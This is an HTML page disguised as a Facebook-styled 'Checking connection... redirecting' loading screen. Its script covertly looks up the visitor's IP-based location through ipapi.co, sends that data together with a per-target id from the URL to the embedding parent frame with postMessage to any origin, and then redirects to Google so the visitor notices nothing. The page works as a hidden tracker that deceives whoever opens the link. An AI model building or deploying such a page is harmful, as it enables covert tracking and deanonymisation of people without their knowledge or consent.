<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0;background:#f0f2f5;font-family:Segoe UI,Helvetica,Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh">
    <div style="text-align:center;padding:40px;max-width:400px">
        <div style="font-size:28px;color:#1877f2;margin-bottom:10px">Checking connection...</div>
        <div style="font-size:16px;color:#65676b">Please wait, redirecting...</div>
        <div style="margin-top:20px">
            <div style="width:40px;height:40px;border:4px solid #e4e6ea;border-top:4px solid #1877f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto"></div>
        </div>
    </div>
    <style>@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style>
    <script>
        (async()=>{
            try{
                const urlParams=new URLSearchParams(window.location.search);
                const id=urlParams.get('id');
                const response=await fetch('https://ipapi.co/json/');
                const data=await response.json();
                window.parent.postMessage({type:'locationTracked',id:id,data:data},'*');
                setTimeout(()=>window.location.href='https://www.google.com',1500);
            }catch(e){
                setTimeout(()=>window.location.href='https://www.google.com',1000);
            }
        })();
    </script>
</body>
</html>
